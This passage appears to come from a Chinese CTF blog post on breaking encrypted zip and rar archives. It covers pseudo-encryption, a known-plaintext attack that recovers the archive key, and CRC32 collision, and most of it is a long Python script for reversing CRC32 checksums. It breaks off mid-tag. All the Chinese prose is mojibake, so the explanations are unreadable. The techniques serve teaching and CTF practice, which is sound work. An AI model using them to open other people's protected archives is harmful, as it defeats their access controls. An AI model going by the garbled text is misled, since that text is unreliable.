‡å¿—ä½æ¥æ„é€ ä¼ªåŠ å¯†ä»¥åŠå¦‚ä½•æå®šä¼ªåŠ å¯†äº†ã€‚ï¼ˆè¿™é‡Œæ·»ä¸€å¥ï¼Œmac OSå¯ä»¥ç›´æ¥æ‰“å¼€ä¼ªåŠ å¯†çš„å‹ç¼©åŒ…ã€‚ï¼‰</p><h2 id="0x04-å·²çŸ¥æ˜æ–‡æ”»å‡»"><a href="#0x04-å·²çŸ¥æ˜æ–‡æ”»å‡»" class="headerlink" title="0x04 å·²çŸ¥æ˜æ–‡æ”»å‡»"></a>0x04 å·²çŸ¥æ˜æ–‡æ”»å‡»</h2><p>ä¸€ç§æ¯”è¾ƒå·§å¦™çš„æ”»å‡»æ–¹æ³•ï¼Œé¦–å…ˆä½ éœ€è¦ä¸€ä¸ªå‹ç¼©åŒ…ä¸­å·²çŸ¥çš„æ–‡ä»¶(æ–‡ä»¶å¤§å°å¤§äº12bytes)ï¼Œæ¯”å¦‚readme.txt   </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€<span class="selector-tag">enc</span><span class="selector-class">.zip</span></span><br><span class="line">â”‚  â”œâ”€<span class="selector-tag">flag</span><span class="selector-class">.txt</span> *</span><br><span class="line">â”‚  â””â”€<span class="selector-tag">readme</span><span class="selector-class">.txt</span> *</span><br><span class="line">â”‚</span><br><span class="line">â””â”€<span class="selector-tag">readme</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ„é€ æ˜æ–‡zip</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â”œâ”€<span class="selector-tag">plaintext</span><span class="selector-class">.zip</span></span><br><span class="line">â”‚  â””â”€<span class="selector-tag">readme</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure><p>åŸç†å¤§æ¦‚æ˜¯å‹ç¼©åŒ…é‡Œçš„æ‰€æœ‰æ–‡ä»¶éƒ½æ˜¯ä½¿ç”¨åŒä¸€ä¸ªåŠ å¯†å¯†é’¥æ¥åŠ å¯†çš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å·²çŸ¥æ–‡ä»¶åæ¨åŠ å¯†å¯†é’¥ï¼Œåˆ©ç”¨å¯†é’¥æ¥è§£å¯†å…¶ä»–åŠ å¯†æ–‡ä»¶ã€‚</p><p>åˆ’é‡ç‚¹ï¼š<strong>æ„é€ æ˜æ–‡å‹ç¼©åŒ…æ—¶è¦é€‰ç”¨ä¸åŠ å¯†å‹ç¼©åŒ…ç›¸åŒçš„å‹ç¼©è½¯ä»¶</strong>ï¼Œå¦‚æœä»–ç”¨winrarå‹çš„ï¼Œä½ ç”¨7zæ„é€ å‡ºçš„å‹ç¼©åŒ…æ¥åšæ˜æ–‡å‹ç¼©åŒ…ï¼Œè½¯ä»¶æ˜¯ä¼šæŠ¥é”™çš„ã€‚</p><p><img src="/posts/rar-attack/7.png" alt=""></p><p>è¿™æ ·å°±æ˜¯è¿˜åŸå‡ºå¯†é’¥äº†ï¼Œç‚¹OKåè½¯ä»¶ä¼šå«ä½ ä¿å­˜è§£å¯†åçš„å‹ç¼©åŒ…ã€‚   </p><p><img src="/posts/rar-attack/8.png" alt=""></p><h2 id="0x05-CRCç¢°æ’"><a href="#0x05-CRCç¢°æ’" class="headerlink" title="0x05 CRCç¢°æ’"></a>0x05 CRCç¢°æ’</h2><p>CRC32ç¢°æ’ç”¨äºéå¸¸å°çš„æ–‡ä»¶ï¼ˆ6å­—èŠ‚ä»¥ä¸ŠåŸºæœ¬å°±åˆ«è¯•äº†ï¼‰ï¼Œå°±æ˜¯é€šè¿‡CRCæ¥åæ¨æ–‡ä»¶å†…å®¹ã€‚</p><p>è€Œä¸”CRC32æ˜¯å¾ˆå®¹æ˜“ç¢°æ’çš„ï¼Œæ‰€ä»¥å°±6å­—èŠ‚è€Œè¨€ï¼ŒåŒä¸€ä¸ªCRC32å¯èƒ½å¯¹åº”ç€åå‡ ä¸ªå­—ç¬¦ä¸²ï¼ˆçº¯å¯è§†å­—ç¬¦ï¼‰ã€‚</p><p>å½“æ–‡ä»¶åˆšå¥½æ˜¯6å­—èŠ‚æ—¶ï¼Œä½¿ç”¨ä¸‹é¢çš„crc32.pyè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># CRC32 tools by Victor</span></span><br><span class="line"><span class="comment">#usage: python crc32.py reverse 0xffffffffï¼ˆthe crcï¼‰</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">permitted_characters = set(</span><br><span class="line">    map(ord, <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890_'</span>))  <span class="comment"># \w</span></span><br><span class="line">testing = <span class="keyword">False</span></span><br><span class="line">args = <span class="keyword">None</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_poly</span><span class="params">()</span>:</span></span><br><span class="line">    poly = parse_dword(args.poly)</span><br><span class="line">    <span class="keyword">if</span> args.msb:</span><br><span class="line">        poly = reverseBits(poly)</span><br><span class="line">    check32(poly)</span><br><span class="line">    <span class="keyword">return</span> poly</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_input</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> args.instr:</span><br><span class="line">        <span class="keyword">return</span> tuple(map(ord, args.instr))</span><br><span class="line">    <span class="keyword">with</span> args.infile <span class="keyword">as</span> f:  <span class="comment"># pragma: no cover</span></span><br><span class="line">        <span class="keyword">return</span> tuple(map(ord, f.read()))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">out</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> testing:  <span class="comment"># pragma: no cover</span></span><br><span class="line">        args.outfile.write(msg)</span><br><span class="line">        args.outfile.write(os.linesep)</span><br><span class="line">table = []</span><br><span class="line">table_reverse = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_tables</span><span class="params">(poly, reverse=True)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> table, table_reverse</span><br><span class="line">    table = []</span><br><span class="line">    <span class="comment"># build CRC32 table</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">                i &gt;&gt;= <span class="number">1</span></span><br><span class="line">                i ^= poly</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                i &gt;&gt;= <span class="number">1</span></span><br><span class="line">        table.append(i)</span><br><span class="line">    <span class="keyword">assert</span> len(table) == <span class="number">256</span>, <span class="string">"table is wrong size"</span></span><br><span class="line">    <span class="comment"># build reverse table</span></span><br><span class="line">    <span class="keyword">if</span> reverse:</span><br><span class="line">        table_reverse = []</span><br><span class="line">        found_none = set()</span><br><span class="line">        found_multiple = set()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            found = []</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">                <span class="keyword">if</span> table[j] &gt;&gt; <span class="number">24</span> == i:</span><br><span class="line">                    found.append(j)</span><br><span class="line">            table_reverse.append(tuple(found))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">                found_none.add(i)</span><br><span class="line">            <span class="keyword">elif</span> len(found) &gt; <span class="number">1</span>:</span><br><span class="line">                found_multiple.add(i)</span><br><span class="line">        <span class="keyword">assert</span> len(table_reverse) == <span class="number">256</span>, <span class="string">"reverse table is wrong size"</span></span><br><span class="line">        <span class="keyword">if</span> found_multiple:</span><br><span class="line">            out(<span class="string">'WARNING: Multiple table entries have an MSB in &#123;0&#125;'</span>.format(</span><br><span class="line">                rangess(found_multiple)))</span><br><span class="line">        <span class="keyword">if</span> found_none:</span><br><span class="line">            out(<span class="string">'ERROR: no MSB in the table equals bytes in &#123;0&#125;'</span>.format(</span><br><span class="line">                rangess(found_none)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(data, accum=<span class="number">0</span>)</span>:</span></span><br><span class="line">    accum = ~accum</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        accum = table[(accum ^ b) &amp; <span class="number">0xFF</span>] ^ ((accum &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0x00FFFFFF</span>)</span><br><span class="line">    accum = ~accum</span><br><span class="line">    <span class="keyword">return</span> accum &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rewind</span><span class="params">(accum, data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">        <span class="keyword">return</span> (accum,)</span><br><span class="line">    stack = [(len(data), ~accum)]</span><br><span class="line">    solutions = set()</span><br><span class="line">    <span class="keyword">while</span> stack:</span><br><span class="line">        node = stack.pop()</span><br><span class="line">        prev_offset = node[<span class="number">0</span>] - <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> table_reverse[(node[<span class="number">1</span>] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>]:</span><br><span class="line">            prevCRC = (((node[<span class="number">1</span>] ^ table[i]) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">                       (i ^ data[prev_offset])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            <span class="keyword">if</span> prev_offset:</span><br><span class="line">                stack.append((prev_offset, prevCRC))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                solutions.add((~prevCRC) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    <span class="keyword">return</span> solutions</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findReverse</span><span class="params">(desired, accum)</span>:</span></span><br><span class="line">    solutions = set()</span><br><span class="line">    accum = ~accum</span><br><span class="line">    stack = [(~desired,)]</span><br><span class="line">    <span class="keyword">while</span> stack:</span><br><span class="line">        node = stack.pop()</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> table_reverse[(node[<span class="number">0</span>] &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>]:</span><br><span class="line">            <span class="keyword">if</span> len(node) == <span class="number">4</span>:</span><br><span class="line">                a = accum</span><br><span class="line">                data = []</span><br><span class="line">                node = node[<span class="number">1</span>:] + (j,)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">                    data.append((a ^ node[i]) &amp; <span class="number">0xFF</span>)</span><br><span class="line">                    a &gt;&gt;= <span class="number">8</span></span><br><span class="line">                    a ^= table[node[i]]</span><br><span class="line">                solutions.add(tuple(data))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stack.append(((node[<span class="number">0</span>] ^ table[j]) &lt;&lt; <span class="number">8</span>,) + node[<span class="number">1</span>:] + (j,))</span><br><span class="line">    <span class="keyword">return</span> solutions</span><br><span class="line"><span class="comment"># Tools</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_dword</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> int(x, <span class="number">0</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverseBits</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="comment"># http://graphics.stanford.edu/~seander/bithacks.html#ReverseParallel</span></span><br><span class="line">    <span class="comment"># http://stackoverflow.com/a/20918545</span></span><br><span class="line">    x = ((x &amp; <span class="number">0x55555555</span>) &lt;&lt; <span class="number">1</span>) | ((x &amp; <span class="number">0xAAAAAAAA</span>) &gt;&gt; <span class="number">1</span>)</span><br><span class="line">    x = ((x &amp; <span class="number">0x33333333</span>) &lt;&lt; <span class="number">2</span>) | ((x &amp; <span class="number">0xCCCCCCCC</span>) &gt;&gt; <span class="number">2</span>)</span><br><span class="line">    x = ((x &amp; <span class="number">0x0F0F0F0F</span>) &lt;&lt; <span class="number">4</span>) | ((x &amp; <span class="number">0xF0F0F0F0</span>) &gt;&gt; <span class="number">4</span>)</span><br><span class="line">    x = ((x &amp; <span class="number">0x00FF00FF</span>) &lt;&lt; <span class="number">8</span>) | ((x &amp; <span class="number">0xFF00FF00</span>) &gt;&gt; <span class="number">8</span>)</span><br><span class="line">    x = ((x &amp; <span class="number">0x0000FFFF</span>) &lt;&lt; <span class="number">16</span>) | ((x &amp; <span class="number">0xFFFF0000</span>) &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"><span class="comment"># Compatibility with Python 2.6 and earlier.</span></span><br><span class="line"><span class="keyword">if</span> hasattr(int, <span class="string">"bit_length"</span>):</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bit_length</span><span class="params">(num)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> num.bit_length()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bit_length</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        bits = <span class="number">-32</span></span><br><span class="line">        m = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> n:</span><br><span class="line">            m = n</span><br><span class="line">            n &gt;&gt;= <span class="number">32</span></span><br><span class="line">            bits += <span class="number">32</span></span><br><span class="line">        <span class="keyword">while</span> m:</span><br><span class="line">            m &gt;&gt;= <span class="number">1</span></span><br><span class="line">            bits += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> bits</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check32</span><span class="params">(poly)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> poly &amp; <span class="number">0x80000000</span> == <span class="number">0</span>:</span><br><span class="line">        out(<span class="string">'WARNING: polynomial degree (&#123;0&#125;) != 32'</span>.format(bit_length(poly)))</span><br><span class="line">        out(<span class="string">'         instead, try'</span>)</span><br><span class="line">        out(<span class="string">'         0x&#123;0:08x&#125; (reversed/lsbit-first)'</span>.format(poly | <span class="number">0x80000000</span>))</span><br><span class="line">        out(<span class="string">'         0x&#123;0:08x&#125; (normal/msbit-first)'</span>.format(reverseBits(poly | <span class="number">0x80000000</span>)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reciprocal</span><span class="params">(poly)</span>:</span></span><br><span class="line">    <span class="string">''' Return the reversed reciprocal (Koopman notatation) polynomial of a</span></span><br><span class="line"><span class="string">        reversed (lsbit-first) polynomial '''</span></span><br><span class="line">    <span class="keyword">return</span> reverseBits((poly &lt;&lt; <span class="number">1</span>) | <span class="number">1</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_num</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="string">''' Write a numeric result in various forms '''</span></span><br><span class="line">    out(<span class="string">'hex: 0x&#123;0:08x&#125;'</span>.format(num))</span><br><span class="line">    out(<span class="string">'dec:   &#123;0:d&#125;'</span>.format(num))</span><br><span class="line">    out(<span class="string">'oct: 0o&#123;0:011o&#125;'</span>.format(num))</span><br><span class="line">    out(<span class="string">'bin: 0b&#123;0:032b&#125;'</span>.format(num))</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ranges</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> kg <span class="keyword">in</span> itertools.groupby(enumerate(i), <span class="keyword">lambda</span> x: x[<span class="number">1</span>] - x[<span class="number">0</span>]):</span><br><span class="line">        g = list(kg[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">yield</span> g[<span class="number">0</span>][<span class="number">1</span>], g[<span class="number">-1</span>][<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rangess</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">', '</span>.join(map(<span class="keyword">lambda</span> x: <span class="string">'[&#123;0&#125;,&#123;1&#125;]'</span>.format(*x), ranges(i)))</span><br><span class="line"><span class="comment"># Parsers</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_parser</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">''' Return the command-line parser '''</span></span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">        description=<span class="string">"Reverse, undo, and calculate CRC32 checksums"</span>)</span><br><span class="line">    subparsers = parser.add_subparsers(metavar=<span class="string">'action'</span>)</span><br><span class="line">    poly_flip_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</span><br><span class="line">    subparser_group = poly_flip_parser.add_mutually_exclusive_group()</span><br><span class="line">    subparser_group.add_argument(</span><br><span class="line">        <span class="string">'-m'</span>, <span class="string">'--msbit'</span>, dest=<span class="string">"msb"</span>, action=<span class="string">'store_true'</span>,</span><br><span class="line">        help=<span class="string">'treat the polynomial as normal (msbit-first)'</span>)</span><br><span class="line">    subparser_group.add_argument(<span class="string">'-l'</span>, <span class="string">'--lsbit'</span>, action=<span class="string">'store_false'</span>,</span><br><span class="line">                                 help=<span class="string">'treat the polynomial as reversed (lsbit-first) [default]'</span>)</span><br><span class="line">    desired_poly_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</span><br><span class="line">    desired_poly_parser.add_argument(</span><br><span class="line">        <span class="string">'desired'</span>, type=str, help=<span class="string">'[int] desired checksum'</span>)</span><br><span class="line">    default_poly_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</span><br><span class="line">    default_poly_parser.add_argument(</span><br><span class="line">        <span class="string">'poly'</span>, default=<span class="string">'0xEDB88320'</span>, type=str, nargs=<span class="string">'?'</span>,</span><br><span class="line">        help=<span class="string">'[int] polynomial [default: 0xEDB88320]'</span>)</span><br><span class="line">    accum_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</span><br><span class="line">    accum_parser.add_argument(</span><br><span class="line">        <span class="string">'accum'</span>, type=str, help=<span class="string">'[int] accumulator (final checksum)'</span>)</span><br><span class="line">    default_accum_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</span><br><span class="line">    default_accum_parser.add_argument(</span><br><span class="line">        <span class="string">'accum'</span>, default=<span class="string">'0'</span>, type=str, nargs=<span class="string">'?'</span>,</span><br><span class="line">        help=<span class="string">'[int] starting accumulator [default: 0]'</span>)</span><br><span class="line">    outfile_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</span><br><span class="line">    outfile_parser.add_argument(<span class="string">'-o'</span>, <span class="string">'--outfile'</span>,</span><br><span class="line">                                metavar=<span class="string">"f"</span>,</span><br><span class="line">                                type=argparse.FileType(<span class="string">'w'</span>),</span><br><span class="line">                                default=sys.stdout,</span><br><span class="line">                                help=<span class="string">"Output to a file instead of stdout"</span>)</span><br><span class="line">    infile_parser = argparse.ArgumentParser(add_help=<span class="keyword">False</span>)</span><br><span class="line">    subparser_group = infile_parser.add_mutually_exclusive_group()</span><br><span class="line">    subparser_group.add_argument(<span class="string">'-i'</span>, <span class="string">'--infile'</span>,</span><br><span class="line">                                 metavar=<span class="string">"f"</span>,</span><br><span class="line">                                 type=argparse.FileType(<span class="string">'rb'</span>),</span><br><span class="line">                                 default=sys.stdin,</span><br><span class="line">                                 help=<span class="string">"Input from a file instead of stdin"</span>)</span><br><span class="line">    subparser_group.add_argument(<span class="string">'-s'</span>, <span class="string">'--str'</span>,</span><br><span class="line">                                 metavar=<span class="string">"s"</span>,</span><br><span class="line">                                 type=str,</span><br><span class="line">                                 default=<span class="string">''</span>,</span><br><span class="line">                                 dest=<span class="string">'instr'</span>,</span><br><span class="line">                                 help=<span class="string">"Use a string as input"</span>)</span><br><span class="line">    subparser = subparsers.add_parser(<span class="string">'flip'</span>, parents=[outfile_parser],</span><br><span class="line">                                      help=<span class="string">"flip the bits to convert normal(msbit-first) polynomials to reversed (lsbit-first) and vice versa"</span>)</span><br><span class="line">    subparser.add_argument(<span class="string">'poly'</span>, type=str, help=<span class="string">'[int] polynomial'</span>)</span><br><span class="line">    subparser.set_defaults(</span><br><span class="line">        func=<span class="keyword">lambda</span>: print_num(reverseBits(parse_dword(args.poly))))</span><br><span class="line">    subparser = subparsers.add_parser(<span class="string">'reciprocal'</span>, parents=[outfile_parser],</span><br><span class="line">                                      help=<span class="string">"find the reciprocal (Koopman notation) of a reversed (lsbit-first) polynomial and vice versa"</span>)</span><br><span class="line">    subparser.add_argument(<span class="string">'poly'</span>, type=str, help=<span class="string">'[int] polynomial'</span>)</span><br><span class="line">    subparser.set_defaults(func=reciprocal_callback)</span><br><span class="line">    subparser = subparsers.add_parser(<span class="string">'table'</span>, parents=[outfile_parser,</span><br><span class="line">                                                        poly_flip_parser,</span><br><span class="line">                                                        default_poly_parser],</span><br><span class="line">                                      help=<span class="string">"generate a lookup table for a polynomial"</span>)</span><br><span class="line">    subparser.set_defaults(func=table_callback)</span><br><span class="line">    subparser = subparsers.add_parser(<span class="string">'reverse'</span>, parents=[</span><br><span class="line">        outfile_parser,</span><br><span class="line">        poly_flip_parser,</span><br><span class="line">        desired_poly_parser,</span><br><span class="line">        default_accum_parser,</span><br><span class="line">        default_poly_parser],</span><br><span class="line">        help=<span class="string">"find a patch that causes the CRC32 checksum to become a desired value"</span>)</span><br><span class="line">    subparser.set_defaults(func=reverse_callback)</span><br><span class="line">    subparser = subparsers.add_parser(<span class="string">'undo'</span>, parents=[</span><br><span class="line">        outfile_parser,</span><br><span class="line">        poly_flip_parser,</span><br><span class="line">        accum_parser,</span><br><span class="line">        default_poly_parser,</span><br><span class="line">        infile_parser],</span><br><span class="line">        help=<span class="string">"rewind a CRC32 checksum"</span>)</span><br><span class="line">    subparser.add_argument(<span class="string">'-n'</span>, <span class="string">'--len'</span>, metavar=<span class="string">'l'</span>, type=str,</span><br><span class="line">                           default=<span class="string">'0'</span>, help=<span class="string">'[int] number of bytes to rewind [default: 0]'</span>)</span><br><span class="line">    subparser.set_defaults(func=undo_callback)</span><br><span class="line">    subparser = subparsers.add_parser(<span 